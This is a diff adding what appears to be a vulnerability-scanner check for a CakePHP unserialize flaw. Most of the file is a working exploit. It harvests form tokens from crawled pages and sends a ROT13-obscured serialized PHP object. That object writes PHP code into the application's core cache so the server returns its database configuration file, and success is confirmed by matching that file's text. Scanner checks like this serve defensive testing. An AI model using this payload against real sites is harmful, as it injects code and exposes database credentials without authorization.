@@ -1,0 +1,84 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+// CakePHP uri to be tested
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri)
+{	
+	var vxml = 'CakePHP_Unserialize.xml'; 
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(lastJob);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testCakePHPunserializeonURI(sf, uri, token, fields)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = sf.url;
+	lastJob.uri  = uri;		
+	lastJob.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);
+	
+	lastJob.request.body = 'data[_Token][key]=' + token + '&data[_Token][fields]=' + fields + '%3AB:3:"Ncc":4:{f:7:"__pnpur";f:3:"onz";f:5:"__znc";n:2:{f:4:"Pber";n:1:{f:6:"Ebhgre";f:42:"../gzc/pnpur/crefvfgrag/pnxr_pber_svyr_znc";}f:3:"Sbb";f:49:"<?+ernqsvyr(\'../pbasvt/qngnonfr.cuc\');+rkvg();+?>";}f:7:"__cnguf";n:0:{}f:9:"__bowrpgf";n:0:{}}&_method=POST';
+	
+	lastJob.execute();
+	
+	return (!lastJob.wasError);
+}
+function exploitCakePHPUnserialize(sf, uri, token, fields)
+{
+	// trace("Exploit");
+	
+	// run three times
+	if (testCakePHPunserializeonURI(sf, uri, token, fields) &&
+			testCakePHPunserializeonURI(sf, uri, token, fields) &&
+			testCakePHPunserializeonURI(sf, uri, token, fields) )
+	{
+		if(lastJob.response.body.indexOf("* This is core configuration file.") != -1) alert(uri);
+	}
+}
+/***********************************************************************************/
+function findCakePHP(list)
+{	
+	for (var i=0;i<list.count; i++){			
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.response.body)
+		{
+			var token = "";
+			var formAction = "";
+			var fields = "";
+			
+			var m = tokenKeyRegex.exec(sf.response.body);            
+			if (m && m.length > 1) {
+				token = m[1]; 
+				var m = formPathRegex.exec(sf.response.body);            
+				if (m && m.length > 1) {
+					formAction = m[1];
+					var m = fieldsToken.exec(sf.response.body);            
+					if (m && m.length > 1) {
+						fields = m[1];
+					}
+				}
+			}
+			
+			if (token && fields) {
+				if (!formAction || formAction.length <= 2) formAction = sf.fullPath;				
+				exploitCakePHPUnserialize(sf, formAction, token, fields);
+				break;
+			}			
+		}	
+	}
+}
+/***********************************************************************************/
+/* main entry point */
+var tokenKeyRegex = /data\[_Token\]\[key\]\" value=\"(.*?)\"/;
+var formPathRegex = /method="post" action="(.*?)"/;
+var fieldsToken = /data\[_Token\]\[fields\]" value="([0-9a-f]{32}).*?"/;
+var list = getNewFiles(loadHttp);
+findCakePHP(list);
